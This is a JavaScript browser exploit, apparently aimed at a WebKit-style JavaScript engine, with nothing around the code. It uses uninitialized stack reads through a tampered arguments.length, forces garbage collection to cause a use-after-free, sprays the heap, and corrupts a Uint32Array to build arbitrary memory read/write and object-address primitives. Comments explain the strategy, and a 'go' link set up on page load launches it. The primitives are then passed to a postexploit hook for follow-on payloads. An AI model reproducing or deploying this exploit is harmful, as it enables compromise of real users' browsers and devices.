var _dview;
function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

function zeroFill( number, width )
{
    width -= number.toString().length;
    if ( width > 0 )
    {
        return new Array( width + (/\./.test( number ) ? 2 : 1) ).join( '0' ) + number;
    }
    return number + ""; // always return a string
}

function int64(low,hi) {
    this.low = (low>>>0);
    this.hi = (hi>>>0);
    this.add32inplace = function(val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo < this.low) {
            new_hi++;
        }
        this.hi=new_hi;
        this.low=new_lo;
    }
    this.add32 = function(val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo < this.low) {
            new_hi++;
        }
        return new int64(new_lo, new_hi);
    }
    this.sub32 = function(val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }
        return new int64(new_lo, new_hi);
    }
    this.sub32inplace = function(val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);
        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }
        this.hi=new_hi;
        this.low=new_lo;
    }
    this.and32 = function(val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }
    this.and64 = function(vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }
    this.toString = function(val) {
        val = 16; // eh
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);
        if(this.hi == 0) return lo_str;
        else {
            lo_str = zeroFill(lo_str, 8)
        }
        return hi_str+lo_str;
    }
    this.toPacked = function() {
        return {hi: this.hi, low: this.low};
    }
    this.setPacked = function(pck) {
        this.hi=pck.hi;
        this.low=pck.low;
        return this;
    }
    
    return this;
}

var pressure = new Array(400);

var dgc = function() {
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = new Uint32Array(0x10000);
    }
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = 0;
    }
}

var frame_arr = [];
var frame_idx = 0;
var peek_val = 0;

function peek_stack() {
    var ret_val = undefined;
    
    var retno = 0xffff;
    arguments.length = { valueOf:
        function() {
            var _retno = retno;
            retno = 1;
            return _retno;
        }
    };
    var args = arguments;
    (function() {
     (function() {
      (function() {
       ret_val = arguments[0xff00];
       }).apply(null, args);
      }).apply(null, frame_arr);
     }).apply(null, frame_arr);
    peek_val = ret_val;
    return ret_val;
}

function poke_stack(val) {
    frame_arr[frame_idx] = val;
    (function() {
     (function() {
      (function() {
       }).apply(null, frame_arr);
      }).apply(null, frame_arr);
     }).apply(null, frame_arr);
    frame_arr[frame_idx] = "LOL";
}

function go() {
    try {
        
        for (var i=0; i < 0xffff; i++)
        {
            frame_arr[i] = i;
        }
        frame_idx = 0;
        poke_stack(0);
        if (peek_stack() == undefined) {
            alert ('not vulnerable');
            return;
        }
        // Primitives are peek/poke to stack.
        // Idea is we store a value in a stack frame, then later use uninitialized mem access to retreive it.
        // However, if we trigger a GC run inbetween, it'll detect the object as non-existing, thus allowing UaF.
        
        frame_idx = 0;
        poke_stack(0);
        peek_stack();
        frame_idx = peek_val;
        
        poke_stack(0x4141);
        for (var k=0; k < 8; k++)
            (function(){})();
        peek_stack();
        
        if (peek_val != 0x4141)
        {
            alert('couldnt align to stack');
            return;
        }
        
        
        var uaf_replacement = new Array(0x1000);
        
        for (var i = 0; i < 0x1000; i++)
        {
            uaf_replacement[i] = [];
            for (var k = 0; k < 0x40; k++) {
                uaf_replacement[i][k] = 0x84749310;
            }
            uaf_replacement[i].unshift(uaf_replacement[i].shift()); // ensure ArrayStorage
        }
        
        var uaf_hold = new Array(0x100);
        for (var i = 0; i < 0x100; i++)
        {
            uaf_hold[i] = [1];
            if ( !(i & 3) ) { // 1 Vector for every 3 ArrayStorage
                for (var k = 0; k < 0x40; k++) {
                    uaf_hold[i][k] = 0x84749310;
                }
            }
            uaf_hold[i].unshift(uaf_hold[i].shift()); // ensure ArrayStorage
        } // poke holes n shit
        var uaf_hold1 = new Array(0x400);
        for (var i = 0; i < 0x400; i++)
        {
            uaf_hold1[i] = [1];
            if ( !(i & 3) ) { // 1 Vector for every 3 ArrayStorage
                for (var k = 0; k < 0x80; k++) {
                    uaf_hold1[i][k] = 0x84749310;
                }
            }
            uaf_hold1[i].unshift(uaf_hold1[i].shift()); // ensure ArrayStorage
        } // poke holes n shit
        
        
        var uaf_target = []; // no arraystorage
        for (var i = 0; i < 0x80; i++) {
            uaf_target[i] = 0x42420000;
        }
        
        poke_stack(uaf_target); // store uaf_target in stack
        uaf_target = 0; // remove reference
        uaf_hold1 = 0; // remove reference
        uaf_hold = 0;
        for (var k=0; k < 4; k++)
            dgc(); // run GC
        
        peek_stack(); // read stored reference
        uaf_target = peek_val;
        peek_val = 0;
        
        for (var i = 0; i < 0x1000; i++)
        {
            for (var k = 0x0; k < 0x80; k++)
            {
                uaf_replacement[i][k] = 0x7fffffff;
                if (uaf_target.length == 0x7fffffff)
                {
                    var yi = i;
                    for (var i = 0; i < yi; i++)
                    {
                        uaf_replacement[i] = 0;
                    }
                    for (var i = yi+1; i < 0x1000; i++)
                    {
                        uaf_replacement[i] = 0;
                    }
                    dgc();

                    var later = new Array(0x20000);
                    var buf = new ArrayBuffer(0x1000);
                    for (var i = 0; i < 0x20000; i++)
                    {
                        later[i] = i;
                    }
                    var overlap = new Array(0x80);
                    for (var i = 0; i < 0x20000; i++)
                    {
                        later[i] = new Uint32Array(buf);
                    }
                    
                    var curi = 0x10000;
                    var found = 0;
                    var smashedButterfly = new int64(0,0);
                    var origData = new int64(0, 0);
                    var locateHelper = new int64(0, 0);
                    
                    while (!found) { // Search for an Uint32Array
                        /*
                         
                         Strategy:
                         -> We have heap buffer overflow in butterfly access on uaf_target
                         -> We can try to alter each quadword into 0x1337, check if any Uint32Array changed it's length
                         -> If it did, we can now copy an Array into m_baseAddress one and leak it's butterfly to later leak jsvalues
                         -> Next up we copy prevView into m_baseAddress
                         -> We now have a master/slave pair of Uint32Arrays.
                         -> We now have the ability to read and write anywhere, plus we hold a pointer to an array's Butterfly, allowing to turn JS objects into pointers and back.
                         
                         */
                        var sv = uaf_target[curi];
                        uaf_target[curi] = 0x1337;
                        for (var i = 0; i < 0x20000; i++)
                        {
                            if (later[i] && later[i].byteLength != 0x1000)
                            {
                                uaf_target[curi] = sv;
                                var smashed = later[i];
                                var overlap = [1337];
                                uaf_target[curi - 5] = overlap;
                                smashedButterfly.low=smashed[2];
                                smashedButterfly.hi=smashed[3];
                                smashedButterfly.keep_gc = overlap;
                                uaf_target[curi - 5] = uaf_target[curi - 2]; // m_baseAddress = prev view
                                uaf_replacement[yi][k] = 0;
                                origData.low=smashed[4];
                                origData.hi=smashed[5];
                                
                                smashed[4] = smashed[12];
                                smashed[5] = smashed[13];
                                smashed[14] = 0x40;
                                
                                var slave = undefined;
                                for (var k = 0; k < 0x20000; k++)
                                {
                                    if (later[k].length == 0x40)
                                    {
                                        slave = later[k];
                                        break;
                                    }
                                }
                                
                                if(!slave) throw new Error("couldn't find slave");
                                
                                smashed[4] = smashedButterfly.low;
                                smashed[5] = smashedButterfly.hi;
                                
                                overlap[0] = uaf_target;
                                var uaf_target_entry = new int64(slave[0], slave[1]);
                                smashed[4] = uaf_target_entry.low;
                                smashed[5] = uaf_target_entry.hi;
                                slave[2]=0;
                                slave[3]=0;
                                uaf_target = 0;
                                
                                later = null;
                                
                                smashed[4] = origData.low;
                                smashed[5] = origData.hi;
                                
                                // derive primitives
                                
                                var leakval = function(obj) {
                                    smashed[4] = smashedButterfly.low;
                                    smashed[5] = smashedButterfly.hi;
                                    overlap[0] = obj;
                                    var val = new int64(slave[0], slave[1]);
                                    slave[0] = 1337;
                                    slave[1] = 0xffff0000;
                                    smashed[4] = origData.low;
                                    smashed[5] = origData.hi;
                                    return val;
                                }
                                
                                var createval = function(val) {
                                    smashed[4] = smashedButterfly.low;
                                    smashed[5] = smashedButterfly.hi;
                                    slave[0] = val.low;
                                    slave[1] = val.hi;
                                    var val = overlap[0];
                                    slave[0] = 1337;
                                    slave[1] = 0xffff0000;
                                    smashed[4] = origData.low;
                                    smashed[5] = origData.hi;
                                    return val;
                                }
                                
                                var read4 = function(addr) {
                                    smashed[4] = addr.low;
                                    smashed[5] = addr.hi;
                                    var val = slave[0];
                                    smashed[4] = origData.low;
                                    smashed[5] = origData.hi;
                                    return val;
                                }
                                
                                var write4 = function(addr, val) {
                                    smashed[4] = addr.low;
                                    smashed[5] = addr.hi;
                                    slave[0] = val;
                                    smashed[4] = origData.low;
                                    smashed[5] = origData.hi;
                                }
                                
                                var read8 = function(addr) {
                                    smashed[4] = addr.low;
                                    smashed[5] = addr.hi;
                                    var val = new int64(slave[0],slave[1]);
                                    smashed[4] = origData.low;
                                    smashed[5] = origData.hi;
                                    return val;
                                }
                                
                                var write8 = function(addr, val) {
                                    smashed[4] = addr.low;
                                    smashed[5] = addr.hi;
                                    if (val == undefined) {
                                        val = new int64(0,0);
                                    }
                                    if (!(val instanceof int64)) {
                                        val = new int64(val,0);
                                    }
                                    
                                    slave[0] = val.low;
                                    slave[1] = val.hi;
                                    
                                    smashed[4] = origData.low;
                                    smashed[5] = origData.hi;
                                }
                                
                                if (createval(leakval(0x1337)) != 0x1337) {
                                    throw new Error("invalid leak/create val behaviour");
                                }
                                
                                var test = [1,2,3,4,5,6,7,8];
                                
                                var test_addr = leakval(test);
                                
                                var butterfly_addr = read8(test_addr.add32(8));
                                
                                if ((butterfly_addr.low == 0 && butterfly_addr.hi == 0) || createval(read8(butterfly_addr)) != 1) {
                                    throw new Error("broken read primitive");
                                }
                                
                                if (window.postexploit) {
                                    window.postexploit({
                                                       read4: read4,
                                                       read8: read8,
                                                       write4: write4,
                                                       write8: write8,
                                                       leakval: leakval,
                                                       createval: createval
                                                       });
                                }
                                
                                document.getElementById("clck").innerHTML = 'done';
                                
                                return 2;
                            }
                        }
                        
                        uaf_target[curi] = sv;
                        
                        curi ++;
                    }
                    alert("done!");
                }
            }
        }
        
        return 1;
    } catch (e) { alert(e); }
}

window.onload = function () {
    document.getElementById("clck").innerHTML = '<a href="javascript:go()">go</a>';
};
